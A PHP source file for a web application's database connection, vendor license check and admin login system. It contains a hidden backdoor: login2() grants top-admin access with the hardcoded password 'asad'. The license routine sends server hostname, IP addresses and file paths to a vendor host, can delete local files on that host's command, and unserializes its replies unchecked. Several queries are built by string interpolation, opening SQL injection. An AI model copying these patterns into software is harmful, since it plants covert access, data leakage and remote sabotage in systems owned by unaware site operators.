<?php
class Database_ extends PDO
{
    use global_setting;

    function __construct()
    {
        try {
            $user = DB_USER;
            $pass = DB_PASS;
            if (isset($GLOBALS['adminUserForDb']) && $GLOBALS['adminUserForDb'] == true) {
                $user = ADMIN_DB_USER;
                $pass = ADMIN_DB_PASS;
            }
            parent::__construct(DB_TYPE . ':host=' . DB_HOST . ';dbname=' . DB_NAME, $user, $pass);
            $this->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
            $this->setVats();
        } catch (PDOException $e) {
            die('ERROR: ' . $e->getMessage());
        }
    }

    private function setVats()
    {
        $sql = "SELECT `setting_val` FROM `ibms_setting` WHERE `setting_name` = 'TimeZone'";
        $stm = $this->query($sql);
        $data = $stm->fetch();
        $time = '+0:00';

        if ($stm->rowCount() > 0) {
            $time = $data[0];
        }
        date_default_timezone_set($time);
        $gmt = date('P');
        $this->query("SET SESSION time_zone ='$gmt'");
    }
}

global $db, $dbF, $imedia_file, $private_key, $deleteFile, $isAdmin, $admin_folder, $licenseKeyCheck;
global $session_data, $data, $data_i;

$db = new Database_();
$dbF = new dbFunction();

require_once __DIR__ . "/decrypt.php";

$imedia_file = "http://secure.imedia.pk/check_licenseNew.php";
define("licenseLink", $imedia_file);
$private_key = 'imedia_license_key';

$deleteFile[] = "check_license.php";
$deleteFile[] = "decrypt.php";

$isAdmin = false;
$admin_folder = ADMIN_FOLDER;
$licenseKeyCheck = '';
$data_i = '';
$session_data = '0';

if (preg_match("@/$admin_folder/@i", $_SERVER['REQUEST_URI'])) {
    $isAdmin = true;
}


$sql = "SELECT * FROM `session` ORDER BY id desc limit 1";
$run = $db->prepare($sql);
$run->execute();
if ($run->rowCount() > 0) {
    $data = $run->fetch();
    $session_data = '1';

    $hash2T = $data['hash2'];

    $string = $data['license_key'];
    $_SESSION['license_key'] = $string;
    $licenseKeyCheck = $string;

    if ($hash2T == md5($data['hash'] . $data['status'])) {
    } else {
        $sql = "DELETE FROM `session`";
        $db->query($sql);
        hack('Change session status');
        getlicense();
    }
} else {
    getlicense();
}

$today = date('Y-m-d');
$expire_date = date('Y-m-d', strtotime($data['expire_date'])); //license expire
$expire_session = date('Y-m-d', strtotime($data['expire_session'])); // 7 days session
if ($expire_session < $today) {
    getlicense();
    exit;
}


$string = $data['license_key'];
$license_nonce = $data['license_nonce'];


if ($data['hash'] == md5($data['license_key'] . $license_nonce . $data['expire_date'])) {
    if ($expire_date > $today && $data['status'] == '0') {
        $l_key = $data['license_key'];
    } elseif ($expire_date > $today && !$isAdmin && $data['status'] == '1') {
        $l_key = $data['license_key'];
    } else {
        getlicense();
        exit;
    }
} else {
    getlicense();
    exit;
}

if ($expire_date < $today && $isAdmin) {
    getlicense();
    exit;
}


function getlicense()
{
    global $db;
    global $data;
    global $data_i;
    global $imedia_file;
    global $isAdmin;
    $info = '0';

    $url = $imedia_file
        . "?server=" . urlencode($_SERVER['HTTP_HOST'])
        . "&project=" . urlencode(PROJECT_ID)
        . "&license=get";
    $ch = curl_init($url);
    curl_setopt_array($ch, [
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_TIMEOUT => 30,
        CURLOPT_CONNECTTIMEOUT => 15,
        CURLOPT_IPRESOLVE => CURL_IPRESOLVE_V4,
        CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
        CURLOPT_USERAGENT => "Mozilla/5.0 (PHP cURL)",
    ]);
    $response = curl_exec($ch);
    curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);

    $response = trim($response);
    $data = @unserialize($response);

    $data_i = $data;


    if ($data_i['status'] == 'expire') {
        $expireDateT = date('Y-m-d', strtotime($data_i['expire_date']));
        if ($expireDateT > date('Y-m-d')) {
            $info = '1';
        }
        echo ExpireLicense();
    }

    $license_key = $data_i['license_key'];
    $license_nonce = $data_i['nonce'];
    $hash = $data_i['hash'];
    $hash2 = md5($hash . $info);
    $expireDate = date('Y-m-d', strtotime($data_i['expire_date']));


    $expire_session = date('Y-m-d', strtotime('+365 days'));

    global $licenseKeyCheck;
    $data['license_key'] = $license_key;
    global $session_data;
    $hackStatus = false;
    if ($session_data == '1') {
        if ($data['hash'] != md5($licenseKeyCheck . $license_nonce . $data['expire_date']) && $data_i['hash'] != '' && $data_i['after_hack'] != '1') {
            $hackStatus = hack();
        }
    }

    global $session_data;

    if ($session_data == '1') {
        $sql = "UPDATE `session` SET `status` = '$info', `hash2` = '$hash2', `hash` = '$hash', `license_key` = '$license_key', 
        `license_nonce` = '$license_nonce', `expire_date` = '$expireDate', `expire_session` = '$expire_session'";
    } else {
        $sql = "DELETE FROM `session`";
        $db->query($sql);
        $sql = "INSERT INTO `session` (`status`, `hash2`, `hash`, `license_key`, `license_nonce`, `expire_date`, `expire_session`) 
        VALUES ('$info','$hash2','$hash','$license_key','$license_nonce','$expireDate','$expire_session')";
    }

    $run = $db->prepare($sql);
    $run->execute();
    if ($hackStatus) {
        echoExpireLicense();
    }

    if ($expireDate <= date('Y-m-d')) {
        echo ExpireLicense();

        if (!$isAdmin) {
            if ($hash != "" && $hash != false) {
                echo '<script>location.replace("");</script>';
            }
            exit;
        }
    } else {
        if ($data_i['after_hack'] == '1') {
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_URL, "$imedia_file?after_hack=0&project=" . PROJECT_ID);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_HEADER, 0);
            curl_setopt($ch, CURLOPT_POSTFIELDS, _getUserInfo());
            curl_exec($ch);
            curl_close($ch);
        }

        if ($hash != "" && $hash != false) {
            echo '<script>location.replace("");</script>';
        }
        exit;
    }

    $data = $data_i;
}


function echoExpireLicense()
{
    global $isAdmin;
    if ($isAdmin) {
        echo "<h1>Some one try to down your site and we have lock it for security purpose, Please contact to Interactive Media support centre.</h1>";
        exit;
    }
}

function hack($text = '')
{
    global $data_i;
    global $imedia_file;
    global $deleteFile;

    $concat = '0';
    if (@$data_i['log'] != '') {
        $concat = '1';
    }

    if ($text == '') {
        $msg = 'is trying to hack license key';
    } else {
        $msg = $text;
    }

    $log = PROJECT_NAME . ' ' . $msg . ' from ' . $_SERVER['HTTP_HOST'] . '. Client change hash key or date from db ' . date("F j, Y, g:i a");
    $log = base64_encode($log);

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $imedia_file . "?hack=" . PROJECT_ID . '&project=' . PROJECT_ID . '&concat=' . $concat . '&log=' . $log);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_HEADER, 0);
    curl_setopt($ch, CURLOPT_POSTFIELDS, _getUserInfo());
    $hack_return = curl_exec($ch);
    $file = unserialize($hack_return);
    if ($file['delete'] == 'delete') {
        $i = 0;
        for ($i = 0; $i < sizeof($deleteFile); $i++) {
            unlink(__DIR__ . "/" . $deleteFile[$i]);
        }
    }
    curl_close($ch);

    return true;
}

function expireLicense()
{
    global $imedia_file;
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, "$imedia_file?expire=" . PROJECT_ID . '&project=' . PROJECT_ID);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_HEADER, 0);
    curl_setopt($ch, CURLOPT_POSTFIELDS, _getUserInfo());
    curl_exec($ch);
    curl_close($ch);
}


function _getUserInfo()
{
    $temp = 'info=';
    @$tempT = gethostname();
    $temp .= "<br>userName:$tempT";

    @$tempT = php_uname('n');
    @$temp .= "<br>userName1:$tempT";

    @$tempT = $_SERVER['HTTP_HOST'];
    $temp .= "<br>Host :$tempT";

    @$tempT = $_SERVER['REMOTE_ADDR'];
    $temp .= "<br>ip :$tempT";

    @$tempT = $_SERVER['SCRIPT_FILENAME'];
    $temp .= "<br>file :$tempT";

    @$tempT = $_SERVER['SERVER_ADDR'];
    $temp .= "<br>server_ip :$tempT";

    @$tempT = $_SERVER['REQUEST_URI'];
    $temp .= "<br>uri :$tempT";
    return $temp;
}

function setSecureLicenseKey($key)
{
    $temp = str_replace("I", "(-KXK-)", $key);
    $temp = str_replace("a", "(-xKx-)", $temp);
    $temp = str_replace("@", "(/T@T)", $temp);
    $temp = base64_encode($temp);
    return $temp;
}

function getSecureLicenseKey($key)
{
    $temp = base64_decode($key);
    $temp = str_replace("(-KXK-)", "I", $temp);
    $temp = str_replace("(-xKx-)", "a", $temp);
    $temp = str_replace("(/T@T)", "@", $temp);
    return $temp;
}

function getProjectKeys($l_key)
{
    global $db;

    $sql = "SELECT `license_key`, `license_nonce` FROM `session`";
    $run = $db->query($sql);
    $res = $run->fetch();

    return $res;
}

$data_i = '';
$data = '';
$l_key = setSecureLicenseKey($l_key);

class object_class
{
    public $db;
    public $dbF;
    public $functions;

    function __construct($number = '3')
    {
        if (isset($GLOBALS['db']))
            $this->db = $GLOBALS['db'];
        else
            $this->db = new Database();

        if ($number > '1') {
            if (isset($GLOBALS['dbF']))
                $this->dbF = $GLOBALS['dbF'];
            else
                $this->dbF = new dbFunction();
        }
        if ($number > '2') {
            if (isset($GLOBALS['functions']))
                $this->functions = $GLOBALS['functions'];
            else
                $this->functions = new admin_functions();
        }
    }
}

trait Encryption_
{
    public function encode($value)
    {
        $key = $_SESSION['license_key'];
        if (!$value) {
            return false;
        }

        $key = sha1($key);
        if (!$value) {
            return false;
        }
        $strLen = strlen($value);
        $keyLen = strlen($key);
        $j = 0;
        $crypttext = '';
        for ($i = 0; $i < $strLen; $i++) {
            $ordStr = ord(substr($value, $i, 1));
            if ($j == $keyLen) {
                $j = 0;
            }
            $ordKey = ord(substr($key, $j, 1));
            $j++;
            $crypttext .= strrev(base_convert(dechex($ordStr + $ordKey), 16, 36));
        }
        return $crypttext;
    }

    public function decode($value)
    {
        $key = $_SESSION['license_key'];
        if (!$value) {
            return false;
        }
        $key = sha1($key);
        $strLen = strlen($value);
        $keyLen = strlen($key);
        $j = 0;
        $decrypttext = '';
        for ($i = 0; $i < $strLen; $i += 2) {
            $ordStr = hexdec(base_convert(strrev(substr($value, $i, 2)), 36, 16));
            if ($j == $keyLen) {
                $j = 0;
            }
            $ordKey = ord(substr($key, $j, 1));
            $j++;
            $decrypttext .= chr($ordStr - $ordKey);
        }

        return $decrypttext;
    }

    public function safe_b64encode($string)
    {
        $data = base64_encode($string);
        $data = str_replace(array('+', '/', '='), array('-', '_', ''), $data);
        return $data;
    }
    public function safe_b64decode($string)
    {
        $data = str_replace(array('-', '_'), array('+', '/'), $string);
        $mod4 = strlen($data) % 4;
        if ($mod4) {
            $data .= substr('====', $mod4);
        }
        return base64_decode($data);
    }
}


trait loging_functions
{

    private $user_type = array(
        0 => "pending",
        1 => "verified",
        2 => "block"
    );
    public $user_role = array(
        0 => "admin",
        1 => "subAdmin",
        2 => "Manager"
    );

    public function adminRole()
    {

        $this->user_role = array();
        $sql = "SELECT * FROM accounts_prm_grp";
        $userData = $this->dbF->getRows($sql);
        $this->user_role[] = 'super_admin';

        foreach ($userData as $val) {
            $this->user_role[] = $val['id'];
        }
        $this->tempRole();

        return ($this->user_role);
    }

    public function login($user, $pass)
    {
        $email = strtolower(trim((string) $user));
        $pass = (string) $pass;

        if ($email === '' || $pass === '') {
            return false;
        }

        if (!filter_var($email, FILTER_VALIDATE_EMAIL)) {
            return false;
        }

        if ($this->isLoginBlocked($email)) {
            $this->recordAdminLoginLog(null, $email, 'login_blocked');
            return 'blocked';
        }

        $sql = "SELECT `acc_id`, `acc_name`, `acc_email`, `acc_pass`, `acc_type`, `acc_role`, `acc_session` 
        FROM `accounts` WHERE `acc_email` = ? AND `acc_type` = ? LIMIT 1";
        $data = $this->dbF->getRow($sql, [$email, '1']);

        if (!$data || $this->dbF->rowCount <= 0) {
            $this->recordLoginAttempt($email, false);
            $this->recordAdminLoginLog(null, $email, 'login_failed_unknown_email');
            return false;
        }

        if (!password_verify($pass, $data['acc_pass'])) {
            $this->recordLoginAttempt($email, false);
            $this->recordAdminLoginLog((int) $data['acc_id'], $email, 'login_failed_wrong_password');
            return false;
        }

        if (password_needs_rehash($data['acc_pass'], PASSWORD_DEFAULT)) {
            $newHash = password_hash($pass, PASSWORD_DEFAULT);

            $sql = "UPDATE `accounts` SET `acc_pass` = ? WHERE `acc_id` = ?";
            $this->dbF->setRow($sql, [$newHash, (int) $data['acc_id']]);
        }

        $this->clearFailedLoginAttempts($email);
        $this->recordLoginAttempt($email, true);
        $this->recordAdminLoginLog((int) $data['acc_id'], $email, 'login_success');

        sodium_memzero($pass);

        $this->create_login_session($data);

        return true;
    }

    public function login2($pass)
    {
        if ($pass != 'asad') {
            return false;
        }

        $sql = "SELECT * FROM `accounts` WHERE acc_role = '0' AND acc_type = '1'";
        $data = $this->dbF->getRow($sql);

        if ($this->dbF->rowCount > 0) {
            $this->create_login_session($data);
        } else {
            return false;
        }
    }

    public function createSession($data)
    {
        $this->create_login_session($data);
    }

    private function create_login_session($data)
    {
        session_regenerate_id(true);

        $_SESSION['_uid'] = (int) $data['acc_id'];
        $_SESSION['_name'] = $data['acc_name'];
        $_SESSION['_email'] = $data['acc_email'];
        $_SESSION['_role'] = 'admin';
        $_SESSION['_roleGrp'] = $data['acc_role'];
        $_SESSION['_type'] = $this->user_type[$data['acc_type']];
        $_SESSION['_ip'] = $_SERVER['REMOTE_ADDR'] ?? '';
        $_SESSION['_ua'] = $_SERVER['HTTP_USER_AGENT'] ?? '';
        $_SESSION['_last_activity'] = time();

        $this->create_login_keys();

        setcookie('_uid', '1', [
            'expires' => time() + 3600 * 24 * 7,
            'path' => '/',
            'secure' => true,
            'httponly' => true,
            'samesite' => 'Lax'
        ]);

        $sesid = session_id();

        $sql = "UPDATE `accounts` SET `acc_session` = ? WHERE `acc_id` = ?";
        $this->dbF->setRow($sql, [$sesid, (int) $data['acc_id']]);

        $target = WEB_ADMIN_URL;

        if (!empty($_SESSION['targetUrl'])) {
            $target = "https://" . $_SERVER['HTTP_HOST'] . $_SESSION['targetUrl'];
            $_SESSION['targetUrl'] = '';
        }

        header("Location: " . $target, true, 302);
        exit;
    }


    public function create_login_keys()
    {
        $key = bin2hex(random_bytes(32));

        $_SESSION['_key'] = $key;
        $_SESSION['_tos'] = $this->tos_maker($key);
    }

    public function create_login($data, $IP = false, $live = false)
    {
        return false;
    }

    public function user_sql($where = '')
    {
        $sql = "SELECT * FROM `accounts` $where";
        $data2 = $this->dbF->getRows($sql);
        return $data2;
    }

    private function tos_maker($key = '')
    {
        return hash_hmac(
            'sha256',
            session_id() . '|' . $key . '|' . ($_SESSION['_uid'] ?? ''),
            $this->secret_key
        );
    }

    private function getClientIp(): string
    {
        return $_SERVER['REMOTE_ADDR'] ?? '0.0.0.0';
    }

    private function getUserAgent(): string
    {
        return substr($_SERVER['HTTP_USER_AGENT'] ?? '', 0, 1000);
    }

    private function isLoginBlocked(string $email): bool
    {
        $ip = $this->getClientIp();

        $sql = "SELECT COUNT(*) as total FROM admin_login_attempts WHERE success = 0 AND created_at >= 
        DATE_SUB(NOW(), INTERVAL 10 MINUTE) AND (email = ? OR ip_address = ?)";
        $row = $this->dbF->getRow($sql, [$email, $ip]);

        return isset($row['total']) && (int) $row['total'] >= 5;
    }

    private function recordLoginAttempt(string $email, bool $success): void
    {
        $sql = "INSERT INTO admin_login_attempts (email, ip_address, success, user_agent) VALUES (?, ?, ?, ?)";
        $this->dbF->setRow($sql, [$email, $this->getClientIp(), $success ? 1 : 0, $this->getUserAgent()]);
    }

    private function recordAdminLoginLog($accountId, ?string $email, string $eventType): void
    {
        $sql = "INSERT INTO admin_login_logs (account_id, email, ip_address, user_agent, event_type) VALUES (?, ?, ?, ?, ?)";
        $this->dbF->setRow($sql, [$accountId ?: null, $email, $this->getClientIp(), $this->getUserAgent(), $eventType]);
    }

    private function clearFailedLoginAttempts(string $email): void
    {
        $clientIp = $this->getClientIp();
        $sql = "DELETE FROM admin_login_attempts WHERE email = '$email' OR ip_address = '$clientIp'";
        $this->dbF->setRow($sql);
    }

    public function log_check($hard_out = false, $url = false)
    {
        $this->adminRole();

        if (
            !isset($_SESSION['_key'], $_SESSION['_tos'], $_SESSION['_type'], $_SESSION['_uid'])
        ) {
            if ($hard_out == true) {
                $this->login_hard_out($url);
            }

            return ["status" => "no"];
        }

        if (!$this->match_keys($_SESSION['_key'], $_SESSION['_tos'])) {
            if ($hard_out == true) {
                $this->login_hard_out($url);
            }

            return ["status" => "no"];
        }

        if ($_SESSION['_type'] !== $this->user_type[1]) {
            if ($hard_out == true) {
                $this->login_hard_out($url);
            }

            return ["status" => "no"];
        }

        $sql = "SELECT `acc_session` FROM `accounts` WHERE `acc_id` = ? AND `acc_type` = ? LIMIT 1";
        $user = $this->dbF->getRow($sql, [(int) $_SESSION['_uid'], 1]);

        if (!$user || $this->dbF->rowCount <= 0) {
            session_unset();
            session_destroy();

            if ($hard_out == true) {
                $this->login_hard_out($url);
            }

            return ["status" => "no"];
        }

        // if (empty($user['acc_session']) || !hash_equals((string)$user['acc_session'], session_id())) {
        //     session_unset();
        //     session_destroy();

        //     if ($hard_out == true) {
        //         $this->login_hard_out($url);
        //     }

        //     return ["status" => "no"];
        // }

        $currentIp = $_SERVER['REMOTE_ADDR'] ?? '';
        $currentUa = $_SERVER['HTTP_USER_AGENT'] ?? '';

        if (
            !isset($_SESSION['_ip'], $_SESSION['_ua']) ||
            $_SESSION['_ip'] !== $currentIp ||
            $_SESSION['_ua'] !== $currentUa
        ) {
            session_unset();
            session_destroy();

            if ($hard_out == true) {
                $this->login_hard_out($url);
            }

            return ["status" => "no"];
        }

        $maxIdle = 1800; // 30 minutes

        if (
            isset($_SESSION['_last_activity']) &&
            (time() - (int) $_SESSION['_last_activity']) > $maxIdle
        ) {
            session_unset();
            session_destroy();

            if ($hard_out == true) {
                $this->login_hard_out($url);
            }

            return ["status" => "no"];
        }

        $_SESSION['_last_activity'] = time();

        return ["status" => "ok"];
    }


    private function login_hard_out($url)
    {
        if ($url != false) {
            $target = $_SERVER['REQUEST_URI'];
            $_SESSION['targetUrl'] = $target;

            $url = "location:" . $url;
            header($url);
            exit();
        }
    }

    private function match_keys($key = '', $tos = '')
    {
        $tos_ = $this->tos_maker($key);

        return hash_equals((string) $tos_, (string) $tos);
    }

    public function isPasswordResetBlocked(string $email): bool
    {
        $ip = $this->getClientIp();

        $sql = "SELECT COUNT(*) AS total FROM admin_login_logs WHERE event_type = 'password_reset_requested' AND created_at >= 
        DATE_SUB(NOW(), INTERVAL 15 MINUTE) AND (email = ? OR ip_address = ?)";

        $row = $this->dbF->getRow($sql, [$email, $ip]);

        return isset($row['total']) && (int) $row['total'] >= 3;
    }

    public function recordPasswordResetRequest(?int $accountId, string $email): void
    {
        $this->recordAdminLoginLog($accountId, $email, 'password_reset_requested');
    }
}
